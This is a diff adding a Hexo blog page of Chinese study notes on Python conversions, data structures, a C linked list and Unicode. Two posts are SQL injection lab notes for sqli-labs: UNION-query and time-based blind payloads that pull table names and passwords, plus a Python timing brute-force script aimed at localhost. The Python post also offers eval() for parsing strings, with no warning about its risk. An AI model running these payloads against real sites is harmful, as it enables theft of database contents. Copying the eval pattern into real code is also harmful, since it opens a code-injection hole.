@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-数据类型之间的转换" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E6%8D%A2/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.582Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/04/17/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E6%8D%A2/">python数据类型之间的转换和类的创建继承</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>如何将字符串转换为列表？<br>string转list<br>命令：list(str)</p>
+<p>将列表作为字符串输出<br>list转string<br>命令：’’.join(list)</p>
+<p>其中，引号中是字符之间的分割符，如“,”，“;”，“\t”等等</p>
+<p>如：</p>
+<p>list &#x3D; [1, 2, 3, 4, 5]</p>
+<p>‘’.join(list) 结果即为：12345</p>
+<p>‘,’.join(list) 结果即为：1,2,3,4,5</p>
+<p>如何将字符串中的数字转换成整数型输出？<br>通过eval（）函数</p>
+<p>eval函数的作用：<br>1 字符串转换成列表：<br>a&#x3D;”[1,2,3,4,5]”<br>b&#x3D;eval(a)</p>
+<h1 id="a是字符串类型数据，b是列表类型数据"><a href="#a是字符串类型数据，b是列表类型数据" class="headerlink" title="a是字符串类型数据，b是列表类型数据"></a>a是字符串类型数据，b是列表类型数据</h1><p>2 字符串转换成字典 ：<br>a&#x3D;”{“name”:”guo”,”age”:25}”<br>b&#x3D;eval(a)</p>
+<h1 id="a为字符串类型数据，b为字典类型数据"><a href="#a为字符串类型数据，b为字典类型数据" class="headerlink" title="a为字符串类型数据，b为字典类型数据"></a>a为字符串类型数据，b为字典类型数据</h1><p>3 字符串转换为元组：<br>a&#x3D;”(1,2,3,4,5)”<br>eval(a)</p>
+<h1 id="a的数据结构是字符串-b的数据结构是元组"><a href="#a的数据结构是字符串-b的数据结构是元组" class="headerlink" title="a的数据结构是字符串 b的数据结构是元组"></a>a的数据结构是字符串 b的数据结构是元组</h1><p>python函数中类的创建和继承<br>例子：<br>class FLOWER:<br>#定义一个类，名称叫做FLOWER<br>    def <strong>init</strong> (self,name):<br>        &#x2F;#这是一个初始化的函数,init前后有两个下划线（注意第一个下划线与def之间要有一个空格）<br>        __init__函数会在调用类的时候自动执行，这里的self是一个储存类的实参#&#x2F;<br>        self.name&#x3D;name<br>        #以self作为前缀的变量可以在类的所有方法中使用<br>    def meant(self):<br>        #在类中你可以创建一些方法，你可以通过.的方法调用</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E6%8D%A2/" data-id="cl22vvyyr000nl4vjexb914su" data-title="python数据类型之间的转换和类的创建继承" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-实验室第一课，union语句的sql注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%8Cunion%E8%AF%AD%E5%8F%A5%E7%9A%84sql%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.578Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/04/17/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%8Cunion%E8%AF%AD%E5%8F%A5%E7%9A%84sql%E6%B3%A8%E5%85%A5/">实验室第一课，union语句的sql注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>联合查询进行注入<br>-1’ union select 1,2,databases（）–+		查询库名<br>-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;database();–+		查询表名<br>-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;’数据库的名字’–+		查询字段名<br>-1’ union select 1,2,group_concat（一个或多个字段名，逗号分隔）from 表名–+		查询数据<br>建议直接不要在max hackbar上注入语句，因为对于空格要进行处理。</p>
+<p>无列名盲注<br>适用于只能获取数据库和表名，但无法查询列的情况（由于information_scheam库被过滤了）<br>利用库mysql，里面有一个innodb_table_stats的表<br>例子：<br>假设已经知道库的名字叫admin，通过语句：select ‘3’ from( select 1,2,3 unioon select * from admin)a    获得表的名字，这里我们伪造了一个虚拟的表并把它命名为a<br>如果‘（反引号）被过滤，构建语句：select b from (select 1,2,3 as b union select * from admin)a    获得表的名字<br>构建语句：select concat(‘2’,Ox2d,’3’)from (select 1,2,3, union select * from admin)a     同时查询多个列（这里的Ox2d是 - 的十六进制编码，作为一种绕过方式）</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%8Cunion%E8%AF%AD%E5%8F%A5%E7%9A%84sql%E6%B3%A8%E5%85%A5/" data-id="cl22vvyyr000ml4vjhfb3dvvd" data-title="实验室第一课，union语句的sql注入" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-时间盲注" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.573Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="title-less-9和less10详解"><a href="#title-less-9和less10详解" class="headerlink" title="title:less 9和less10详解"></a>title:less 9和less10详解</h2><p>由于页面回显始终只有一种，因此无法使用布尔盲注，只能使用时间盲注。<br>使用时间盲注时我们会用到if语句和sleep()函数进行配合：<br>if(expr1,expr2,expr3)：当语句1返回的结果为true时，执行语句2，反之则执行语句3<br>构建的payload<br>?id&#x3D;1’ and if(length(database())&#x3D;8,sleep(5),0)–+<br>?id&#x3D;1’ and if(left(database(),1)&#x3D;’s’,sleep(5),1)–+<br>?id&#x3D;1’ and if( left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1)&#x3D;’r’ ,sleep(5),1)–+<br>这一句的limit1，1起了限制作用，查询第一个数据表的第一个字母<br>?id&#x3D;1’ and if(left((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 4,1),8)&#x3D;’password’ ,sleep(5),1)–+<br>这一句查询列名<br>?id&#x3D;1’ and if(left((select password from users order by id limit 0,1),4)&#x3D;’dumb’ ,sleep(5),1)–+<br>得到password为dumb<br>?id&#x3D;1’ and if(left((select username from users order by id limit 0,1),4)&#x3D;’dumb’ ,sleep(5),1)–+<br>——————————<br>less 10改为双引号字符型注入，其他与less9一样<br>——————————<br>python盲注脚本<br>得到username为dumb<br>import requests<br>import datetime<br>s&#x3D;requests.session()<br>url&#x3D;”<a target="_blank" rel="noopener" href="http://localhost:81/sqli-labs-php7-master/Less-9?id=1&quot;">http://localhost:81/sqli-labs-php7-master/Less-9?id=1&quot;</a><br>payload_try&#x3D;’0123456789abcdefghijklmnopqrstuvwxyz’<br>passwd&#x3D;’’<br>for i in range(1,9):<br>    for j in payload_try:<br>        payload&#x3D;f”‘and if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),{i},1)&#x3D;’{j}’,sleep(1),1)–+”<br>        print(payload)<br>        time1&#x3D;datetime.datetime.now()<br>        r&#x3D;s.get(url+payload)<br>        time2&#x3D;datetime.datetime.now()<br>        sec&#x3D;(time2-time1).seconds<br>        if sec&gt;&#x3D;1:<br>           passwd+&#x3D;j<br>           print(passwd)</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" data-id="cl22vvyys000ol4vjg85lcma6" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-入门数据结构与算法" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/%E5%85%A5%E9%97%A8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.570Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/04/17/%E5%85%A5%E9%97%A8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/">入门数据结构与算法</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>数据结构的基本分类<br>数据结构分为逻辑结构和物理结构<br>四大逻辑结构：<br>集合结构，每个元素都独立存在<br>线性结构，所有元素都一对一的联系<br>树形结构，元素之间存在一对多的层次关系<br>图形结构，元素是多对多的关系<br>物理结构;如何把数据元素存储到计算机的存储器中，有顺序存储和链式存储。</p>
+<p>算法具有五个基本特征：输入、输出、有穷性、确定性和可行性<br>要求：<br>1、正确性，没有语法错误、对于合法的输入能满足产生满足要求的输出、<br>、对非法输入能产生满足规格的说明、对于故意刁难的测试输入都有满足要求的输出结果<br>缓冲区溢出，通过特定（设计好）的输入使得系统出现问题，在缓冲区部分出现问题，出现溢出，把原来的指令转换为我们设计好的指令和语句和跳转（安全）<br>2、可读性：别人看得懂<br>3、健壮性：当输入数据不合法时，也能进行相关处理，而不是产生异常、崩溃、或莫名其妙的结果<br>4、时间效率高和存储量低</p>
+<p>算法效率的度量方法：<br>算法的时间复杂度和空间复杂度</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/%E5%85%A5%E9%97%A8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/" data-id="cl22vvyyr000ll4vj2jnq1m80" data-title="入门数据结构与算法" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-链表的创建，查找，删除，输出" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/%E9%93%BE%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA%EF%BC%8C%E6%9F%A5%E6%89%BE%EF%BC%8C%E5%88%A0%E9%99%A4%EF%BC%8C%E8%BE%93%E5%87%BA/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.566Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/04/17/%E9%93%BE%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA%EF%BC%8C%E6%9F%A5%E6%89%BE%EF%BC%8C%E5%88%A0%E9%99%A4%EF%BC%8C%E8%BE%93%E5%87%BA/">链表创建、头插、尾插、删除、翻转、删除相同元素、遍历、判断链表是否为空</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>#include&lt;stdio.h&gt;<br>#include&lt;stdlib.h&gt;<br>typedef struct Node{<br>    int data;<br>    struct Node *next;<br>}Node;<br>void createLink(Node *head,int size);<br>void travelLink(Node *head);<br>void travelLink(Node *head);<br>void insertForward(Node *head,int data);<br>void insertBack(Node *head,int data);<br>void deleteSame(Node *head);<br>void reverseLink(Node *head);<br>void deleteLink(Node *head);<br>void isEmpty(Node *head);<br>int main(){<br>    &#x2F;&#x2F;主函数中不能指定一个头指针，应该定义一个头指针指向头结点<br>    Node <em>head &#x3D; (Node</em>)malloc(sizeof(Node));<br>    head -&gt; next &#x3D; NULL;<br>    createLink(head,10);&#x2F;&#x2F;创建链表<br>    travelLink(head);&#x2F;&#x2F;遍历链表<br>    insertForward(head,100);&#x2F;&#x2F;头插法<br>    insertBack(head,200);&#x2F;&#x2F;尾插法<br>    travelLink(head);&#x2F;&#x2F;遍历链表<br>    deleteSame(head);&#x2F;&#x2F;删除相同元素<br>    travelLink(head);&#x2F;&#x2F;遍历链表<br>    reverseLink(head);&#x2F;&#x2F;翻转链表元素<br>    travelLink(head);&#x2F;&#x2F;遍历链表<br>    deleteLink(head);&#x2F;&#x2F;删除链表<br>    isEmpty(head);&#x2F;&#x2F;判断链表是否为空<br>    return 0;<br>}<br>&#x2F;&#x2F;创建链表<br>void createLink(Node *head,int size){<br>    Node *rear &#x3D; head;<br>    int i;<br>    for(i &#x3D; 0;i &lt; size;++i){<br>        Node *newnode &#x3D; (Node*)malloc(sizeof(Node));<br>        newnode -&gt; next &#x3D; NULL;<br>        scanf(“%d”,&amp;newnode-&gt;data);<br>        rear -&gt; next &#x3D; newnode;<br>        rear &#x3D; newnode;<br>    }<br>}<br>&#x2F;&#x2F;遍历链表<br>void travelLink(Node *head){<br>    Node *p &#x3D; head -&gt; next;<br>    while(p !&#x3D; NULL){<br>        printf(“%d\t”,p-&gt;data);<br>        p &#x3D; p -&gt; next;<br>    }<br>    putchar(‘\n’);<br>}<br>&#x2F;&#x2F;头插法<br>void insertForward(Node *head,int data){<br>    Node <em>newnode &#x3D; (Node</em>)malloc(sizeof(Node));<br>    newnode -&gt; next &#x3D; NULL;<br>    newnode -&gt; data &#x3D; data;<br>    newnode -&gt; next &#x3D; head -&gt; next;<br>    head -&gt; next &#x3D; newnode;<br>}<br>&#x2F;&#x2F;尾插法<br>void insertBack(Node *head,int data){<br>    Node <em>newnode &#x3D; (Node</em>)malloc(sizeof(Node));<br>    newnode -&gt; next &#x3D; NULL;<br>    newnode -&gt; data &#x3D; data;<br>    Node *p &#x3D; head;<br>    while(p-&gt;next !&#x3D; NULL){<br>        p &#x3D; p -&gt; next;<br>    }<br>    p -&gt; next &#x3D; newnode;<br>    p &#x3D; newnode;<br>}<br>&#x2F;&#x2F;删除相同元素<br>void deleteSame(Node *head){<br>    Node *curr &#x3D; head -&gt; next;<br>    while(curr !&#x3D; NULL){<br>        Node *pre &#x3D; curr;<br>        Node *p &#x3D; curr -&gt; next;<br>        while(p !&#x3D; NULL){<br>            &#x2F;&#x2F;若有相同的元素，则删除；否则两个指针继续向下走<br>            if(curr-&gt;data &#x3D;&#x3D; p-&gt;data){<br>                pre -&gt; next &#x3D; p -&gt; next;<br>                free(p);<br>                p &#x3D; pre -&gt; next;<br>            }else{<br>                pre &#x3D; pre -&gt; next;<br>                p &#x3D; p -&gt; next;<br>            }<br>        }<br>        curr &#x3D; curr -&gt; next;<br>    }<br>}<br>&#x2F;&#x2F;翻转链表<br>void reverseLink(Node *head){<br>    Node *curr;<br>    Node *pre &#x3D; NULL;<br>    while(head -&gt; next !&#x3D; NULL){<br>        curr &#x3D; head -&gt; next;<br>        head -&gt; next &#x3D; curr -&gt; next;<br>        curr -&gt; next &#x3D; pre;<br>        pre &#x3D; curr;<br>    }<br>    head -&gt; next &#x3D; pre;<br>}<br>&#x2F;&#x2F;删除链表<br>void deleteLink(Node *head){<br>    Node *curr;<br>    while(head -&gt; next !&#x3D; NULL){<br>        curr &#x3D; head -&gt; next;<br>        head -&gt; next &#x3D; curr -&gt; next;<br>        free(curr);<br>    }<br>}<br>&#x2F;&#x2F;判断链表是否为空<br>void isEmpty(Node *head){<br>    if(head -&gt; next &#x3D;&#x3D; NULL){<br>        printf(“链表为空！\n”);<br>    }else{<br>        printf(“链表不为空！\n”);<br>    }<br>}</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/%E9%93%BE%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA%EF%BC%8C%E6%9F%A5%E6%89%BE%EF%BC%8C%E5%88%A0%E9%99%A4%EF%BC%8C%E8%BE%93%E5%87%BA/" data-id="cl22vvyyt000rl4vje8wwfelm" data-title="链表创建、头插、尾插、删除、翻转、删除相同元素、遍历、判断链表是否为空" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-编码补充" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/%E7%BC%96%E7%A0%81%E8%A1%A5%E5%85%85/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.562Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="title-l编码补充"><a href="#title-l编码补充" class="headerlink" title="title:l编码补充"></a>title:l编码补充</h2><p>为啥需要Unicode</p>
+<pre><code>  我们知道计算机其实挺笨的,它只认识0101这样的字符串,当然了我们看这样的01串时肯定会比较头晕的,所以很多时候为了描述简单都用十进制,十六进制,八进制表示.实际上都是等价的,没啥太多不一样.其他啥文字图片之类的其他东东计算机不认识.那为了在计算机上表示这些信息就必须转换成一些数字.你肯定不能想怎么转换就怎么转,必须得有定些规则.于是刚开始的时候就有ASCII字符集(American Standard Code for Information Interchange， &quot;美国信息交换标准码),它使用7 bits来表示一个字符,总共表示128个字符,我们一般都是用字节(byte,即8个01串)来作为基本单位.那么怎么当用一个字节来表示字符时第一个bit总是0,剩下的七个字节就来表示实际内容.后来IBM公司在此基础上进行了扩展，用8bit来表示一个字符，总共可以表示256个字符.也就是当第一个bit是0时仍表示之前那些常用的字符.当为1时就表示其他补充的字符.
+
+    英文字母再加一些其他标点字符之类的也不会超过256个.一个字节表示主足够了.但其他一些文字不止这么多 ,像汉字就上万个.于是又出现了其他各种字符集.这样不同的字符集交换数据时就有问题了.可能你用某个数字表示字符A,但另外的字符集又是用另外一个数字表示A.这样交互起来就麻烦了.于是就出现了Unicode和ISO这样的组织来统一制定一个标准,任何一个字符只对应一个确定的数字.ISO取的名字叫UCS(Universal Character Set),Unicode取的名字就叫unicode了.
+
+  总结起来为啥需要Unicodey就是为了适应全球化的发展,便于不同语言之间的兼容交互,而ASCII不再能胜任此任务了.
+</code></pre>
+<p>Unicode详细介绍</p>
+<p>1.容易产生后歧义的两字节</p>
+<pre><code>    unicode的第一个版本是用两个字节(16bit)来表示所有字符
+
+    .实际上这么说容易让人产生歧义,我们总觉得两个字节就代表保存在计算机中时是两个字节.于是任何字符如果用unicode表示的话保存下来都占两个字节.其实这种说法是错误的.
+
+ 其实Unicode涉及到两个步骤,首先是定义一个规范,给所有的字符指定一个唯一对应的数字,这完全是数学问题,可以跟计算机没半毛钱关系.第二步才是怎么把字符对应的数字保存在计算机中,这才涉及到实际在计算机中占多少字节空间.
+
+ 所以我们也可以这样理解,Unicode是用0至65535之间的数字来表示所有字符.其中0至127这128个数字表示的字符仍然跟ASCII完全一样.65536是2的16次方.这是第一步.第二步就是怎么把0至65535这些数字转化成01串保存到计算机中.这肯定就有不同的保存方式了.于是出现了UTF(unicode transformation format),有UTF-8,UTF-16.
+</code></pre>
+<p>2.UTF-8 与UTF-16的区别</p>
+<pre><code>UTF-16比较好理解,就是任何字符对应的数字都用两个字节来保存.我们通常对Unicode的误解就是把Unicode与UTF-16等同了.但是很显然如果都是英文字母这做有点浪费.明明用一个字节能表示一个字符为啥整两个啊.
+</code></pre>
+<p>   于是又有个UTF-8,这里的8非常容易误导人,8不是指一个字节,难道一个字节表示一个字符?实际上不是.当用UTF-8时表示一个字符是可变的,有可能是用一个字节表示一个字符,也可能是两个,三个..反正是根据字符对应的数字大小来确定.</p>
+<p>   于是UTF-8和UTF-16的优劣很容易就看出来了.如果全部英文或英文与其他文字混合,但英文占绝大部分,用UTF-8就比UTF-16节省了很多空间.而如果全部是中文这样类似的字符或者混合字符中中文占绝大多数.UTF-16就占优势了,可以节省很多空间.另外还有个容错问题,等会再讲</p>
+<p>  看的有点晕了吧,举个例子.假如中文字”汉”对应的unicode是6C49(这是用十六进制表示,用十进制表示是27721为啥不用十进制表示呢?很明显用十六进制表示要短点.其实都是等价的没啥不一样.就跟你说60分钟和1小时一样.).你可能会问当用程序打开一个文件时我们怎么知道那是用的UTF-8还是UTF-16啊.自然会有点啥标志,在文件的开头几个字节就是标志.</p>
+<p>EF BB BF 表示UTF-8</p>
+<p>FE FF 或者 FF FE 表示UTF-16.</p>
+<p>用UTF-16表示”汉”</p>
+<p>假如用UTF-16表示的话就是01101100   01001001(共16 bit,两个字节).程序解析的时候知道是UTF-16就把两个字节当成一个单元来解析.这个很简单.</p>
+<p>用UTF-8表示”汉”</p>
+<p>用UTF-8就有复杂点.因为此时程序是把一个字节一个字节的来读取,然后再根据字节中开头的bit标志来识别是该把1个还是两个或三个字节做为一个单元来处理.</p>
+<p>0xxxxxxx,如果是这样的01串,也就是以0开头后面是啥就不用管了XX代表任意bit.就表示把一个字节做为一个单元.就跟ASCII完全一样.</p>
+<p>110xxxxx 10xxxxxx.如果是这样的格式,则把两个字节当一个单元</p>
+<p>1110xxxx 10xxxxxx 10xxxxxx 如果是这种格式则是三个字节当一个单元.</p>
+<p>这是约定的规则.你用UTF-8来表示时必须遵守这样的规则.我们知道UTF-16不需要用啥字符来做标志,所以两字节也就是2的16次能表示65536个字符.</p>
+<p>而UTF-8由于里面有额外的标志信息,所有一个字节只能表示2的7次方128个字符,两个字节只能表示2的11次方2048个字符.而三个字节能表示2的16次方,65536个字符.</p>
+<p>由于”汉”的编码27721大于2048了所有两个字节还不够,只能用三个字节来表示.</p>
+<p>所有要用1110xxxx 10xxxxxx 10xxxxxx这种格式.把27721对应的二进制从左到右填充XXX符号(实际上不一定从左到右,也可以从右到左,这是涉及到另外一个问题.等会说.</p>
+<p>刚说到填充方式可以不一样,于是就出现了Big-Endian,Little-Endian的术语.Big-Endian就是从左到右,Little-Endian是从右到左.</p>
+<p>由上面我们可以看出UTF-8在局部的字节错误（丢失、增加、改变）不会导致连锁性的错误，因为 UTF-8 的字符边界很容易检测出来，所以容错性较高。</p>
+<p>Unicode版本2</p>
+<pre><code>前面说的都是unicode的第一个版本.但65536显然不算太多的数字,用它来表示常用的字符是没一点问题.足够了,但如果加上很多特殊的就也不够了.于是从1996年开始又来了第二个版本.用四个字节表示所有字符.这样就出现了UTF-8,UTF16,UTF-32.原理和之前肯定是完全一样的,UTF-32就是把所有的字符都用32bit也就是4个字节来表示.然后UTF-8,UTF-16就视情况而定了.UTF-8可以选择1至8个字节中的任一个来表示.而UTF-16只能是选两字节或四字节..由于unicode版本2的原理完全是一样的,就不多说了.
+</code></pre>
+<p>前面说了要知道具体是哪种编码方式,需要判断文本开头的标志,下面是所有编码对应的开头标志</p>
+<p>EF BB BF　　　 UTF-8<br>FE FF　　　　　UTF-16&#x2F;UCS-2, big endian<br>FF FE　　　　　UTF-16&#x2F;UCS-2, little endian<br>FF FE 00 00　　UTF-32&#x2F;UCS-4, little endian.<br>00 00 FE FF　　UTF-32&#x2F;UCS-4, big-endian.</p>
+<p>其中的UCS就是前面说的ISO制定的标准,和Unicode是完全一样的,只不过名字不一样.ucs-2对应utf-16,ucs-4对应UTF-32.UTF-8是没有对应的UCS</p>
+<p>UTF-16 并不是一个完美的选择，它存在几个方面的问题：<br>UTF-16 能表示的字符数有 6 万多，看起来很多，但是实际上目前 Unicode 5.0 收录的字符已经达到 99024 个字符，早已超过 UTF-16 的存储范围；这直接导致 UTF-16 地位颇为尴尬——如果谁还在想着只要使用 UTF-16 就可以高枕无忧的话，恐怕要失望了<br>UTF-16 存在大小端字节序问题，这个问题在进行信息交换时特别突出——如果字节序未协商好，将导致乱码；如果协商好，但是双方一个采用大端一个采用小端，则必然有一方要进行大小端转换，性能损失不可避免（大小端问题其实不像看起来那么简单，有时会涉及硬件、操作系统、上层软件多个层次，可能会进行多次转换）<br>另外，容错性低有时候也是一大问题——局部的字节错误，特别是丢失或增加可能导致所有后续字符全部错乱，错乱后要想恢复，可能很简单，也可能会非常困难。（这一点在日常生活里大家感觉似乎无关紧要，但是在很多特殊环境下却是巨大的缺陷）<br>目前支撑我们继续使用 UTF-16 的理由主要是考虑到它是双字节的，在计算字符串长度、执行索引操作时速度很快。当然这些优点 UTF-32 都具有，但很多人毕竟还是觉得 UTF-32 太占空间了。</p>
+<p>反过来 UTF-8 也不完美，也存在一些问题：<br>文化上的不平衡——对于欧美地区一些以英语为母语的国家 UTF-8 简直是太棒了，因为它和 ASCII 一样，一个字符只占一个字节，没有任何额外的存储负担；但是对于中日韩等国家来说，UTF-8 实在是太冗余，一个字符竟然要占用 3多个字节，存储和传输的效率不但没有提升，反而下降了。所以欧美人民常常毫不犹豫的采用 UTF-8，而我们却老是要犹豫一会儿<br>变长字节表示带来的效率问题——大家对 UTF-8 疑虑重重的一个问题就是在于其因为是变长字节表示，因此无论是计算字符数，还是执行索引操作效率都不高。为了解决这个问题，常常会考虑把 UTF-8 先转换为 UTF-16 或者 UTF-32 后再操作，操作完毕后再转换回去。而这显然是一种性能负担。</p>
+<p>当然，UTF-8 的优点也不能忘了：<br>字符空间足够大，未来 Unicode 新标准收录更多字符，UTF-8 也能妥妥的兼容，因此不会再出现 UTF-16 那样的尴尬<br>不存在大小端字节序问题，信息交换时非常便捷<br>容错性高，局部的字节错误（丢失、增加、改变）不会导致连锁性的错误，因为 UTF-8 的字符边界很容易检测出来，这是一个巨大的优点（正是为了实现这一点，咱们中日韩人民不得不忍受 3 字节 1 个字符的苦日子）</p>
+<p>那么到底该如何选择呢？</p>
+<p>因为无论是 UTF-8 和 UTF-16&#x2F;32 都各有优缺点，因此选择的时候应当立足于实际的应用场景。例如在我的习惯中，存储在磁盘上或进行网络交换时都会采用 UTF-8，而在程序内部进行处理时则转换为 UTF-16&#x2F;32。对于大多数简单的程序来说，这样做既可以保证信息交换时容易实现相互兼容，同时在内部处理时会比较简单，性能也还算不错。（基本上只要你的程序不是 I&#x2F;O 密集型的都可以这么干，当然这只是我粗浅的认识范围内的经验，很可能会被无情的反驳）<br>（搬运）</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/%E7%BC%96%E7%A0%81%E8%A1%A5%E5%85%85/" data-id="cl22vvyys000ql4vj1uufg50l" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-upload" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/upload/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.559Z" itemprop="datePublished">2022-04-17</time>
